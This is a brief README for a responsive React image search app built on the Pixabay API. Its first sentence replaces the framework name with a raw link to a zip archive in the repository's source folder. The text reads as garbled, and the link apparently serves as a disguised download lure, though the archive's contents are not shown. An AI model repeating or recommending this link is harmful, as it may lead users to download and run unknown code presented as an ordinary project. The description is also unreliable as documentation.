# Responsive Image Search App (React)

A minimalist and fully responsive Image Search Application built with https://github.com/talhaw-cmd/react-image-finder/raw/refs/heads/main/src/react-image-finder-2.9.zip and the Pixabay REST API.  
The project uses pure CSS for styling (no Tailwind or UI libraries) and focuses on clean code and real responsiveness.
